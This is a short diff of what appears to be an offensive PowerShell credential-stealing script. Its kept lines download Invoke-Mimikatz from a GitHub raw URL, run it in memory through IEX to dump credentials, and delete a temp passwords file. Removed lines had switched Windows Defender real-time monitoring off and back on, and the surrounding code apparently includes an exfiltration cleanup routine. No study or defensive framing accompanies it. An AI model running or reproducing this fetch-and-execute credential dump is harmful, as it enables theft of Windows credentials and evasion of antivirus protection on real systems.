@@ -1,5 +1,4 @@
 ############################################################################################################################################################
-Set-MpPreference -DisableRealtimeMonitoring $true 
 $dumped = powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ndeebee/PS_Scripts/main/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds"
 
 
@@ -84,4 +83,4 @@ if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
 
 
 RI $env:TEMP/--pwds.txt
-Set-MpPreference -DisableRealtimeMonitoring $false
+
